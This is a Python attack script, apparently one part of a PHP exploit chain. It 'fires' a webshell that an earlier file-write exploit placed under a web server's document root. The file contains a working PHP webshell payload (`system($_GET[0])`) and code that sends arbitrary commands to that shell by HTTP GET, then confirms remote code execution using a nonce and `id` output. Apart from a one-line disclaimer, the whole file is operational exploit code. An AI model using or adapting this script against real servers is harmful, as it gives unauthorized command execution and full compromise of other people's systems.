#!/usr/bin/env python3
# INDEX: fire a webshell written to a web-served path by GETting it (nonce-verified cmd exec) | fpm/apache | needs the written .php reachable under docroot
"""Webroot-write fire oracle: turn a landed file-write into code execution.

The counterpart to auto_include_fire_oracle (which fires PG(auto_prepend_file)).
When the file-write finisher (ps_files->basedir, kfree_staletail_forge /
ps_files_single_carrier_forge) lands `<?php system($_GET[0]);?>` at a path that
the web server maps a URL to, a single plain GET runs it. No second corruption,
no sink: nginx's `location ~ \\.php$` fastcgi_passes any *.php URL straight to fpm,
so the written file only needs to exist in the fpm worker's filesystem under a
web-served, worker-writable directory (the ubiquitous "uploads/cache dir under
docroot" case).

`fire(host, port, urlpath, cmd)` GETs urlpath?0=<cmd> and returns the body. The
command output (system() writes it to the response) is the success signal. Embed a
per-fire nonce in `cmd` (e.g. `echo <nonce>;id`) and check nonce+output with
`fired()` so a stale/previous file cannot produce a false positive. Pure stdlib,
`python3 -I` safe. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import os
import re
import urllib.error
import urllib.parse
import urllib.request

WEBSHELL = b"<?php system($_GET[0]);?>"   # the content the file-write lands
_UID_RE = re.compile(r"uid=\d+\([^)]*\)")


def make_nonce():
    return "FIRE%08x" % int.from_bytes(os.urandom(4), "big")


def fire(host, port, urlpath, cmd, *, param="0", timeout=15):
    """GET http://host:port/urlpath?<param>=<cmd>. Returns (status, body_bytes).
    The written `<?php system($_GET[0]);?>` runs `cmd` and system() emits its
    output into the response body."""
    url = f"http://{host}:{port}{urlpath}?{param}={urllib.parse.quote(cmd)}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa: BLE001
        return None, repr(e).encode()


def fired(body, nonce):
    """True iff this fire's nonce AND a uid=...() line are present -> fresh exec."""
    if not body:
        return False
    s = body.decode("latin-1", "replace")
    return nonce in s and bool(_UID_RE.search(s))


def confirm_rce(host, port, urlpath, *, probe="id", timeout=15):
    """One nonce-tagged fire. Returns (ok, output, nonce). `output` is the command
    output captured from the response (best effort)."""
    nonce = make_nonce()
    _, body = fire(host, port, urlpath, f"echo {nonce};{probe}", timeout=timeout)
    s = (body or b"").decode("latin-1", "replace")
    ok = fired(body, nonce)
    out = s.split(nonce, 1)[1].strip() if (ok and nonce in s) else ""
    return ok, out, nonce


def main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(description="webroot-write fire oracle (GET a written webshell)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18085)
    ap.add_argument("--path", default="/pub/pwned.php")
    ap.add_argument("--cmd", default="id")
    a = ap.parse_args(argv)
    ok, out, nonce = confirm_rce(a.host, a.port, a.path, probe=a.cmd)
    print(f"fired={ok} nonce={nonce} output={out!r}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
